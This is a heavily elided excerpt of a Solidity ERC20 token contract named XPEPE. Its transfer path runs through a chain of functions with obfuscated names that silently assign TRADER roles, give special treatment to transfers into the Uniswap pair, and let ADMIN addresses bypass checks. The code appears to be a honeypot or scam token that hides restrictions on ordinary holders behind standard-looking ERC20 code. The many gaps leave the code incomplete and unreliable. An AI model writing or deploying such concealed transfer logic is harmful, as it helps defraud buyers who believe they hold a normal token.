...
abstract contract XPEPEIConsole is Context, XPEPEIRoleControl {
...
contract XPEPE is Context, IERC20, IERC20Metadata {
...
contract XPEPEToken is XPEPE, XPEPEIConsole {
    ...
    ) XPEPE(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(XPEPE) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _XPEPEIcxvfdh(from, to, amt);

    }

    function _XPEPEIcxvfdh(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _XPEPEIjdbfyhr(from, to, amt);
    }


    function _XPEPEIjdbfyhr(address from, address to, uint256 amt) internal {
        ...
        _XPEPEIdhyer(from, to, amt);
    }

    function _XPEPEIdhyer(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        _XPEPEIdfgthy(from, to, amt);
    }

    function _XPEPEIdfgthy(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _XPEPEIikfdxc(from, to, amt);
    }


    function _XPEPEIikfdxc(address from, address to, uint256 amt) internal {
        if(to == uniswapV2Pair){
            if(opennum > 99){
        ...
        _XPEPEIdfhyn(from, to, amt);
    }

    function _XPEPEIdfhyn(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
            return;
        }else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {

           _XPEPEInhcytbdf(from, to, amt);
    ...
    function _XPEPEInhcytbdf(address from, address to, uint256 amt) internal {
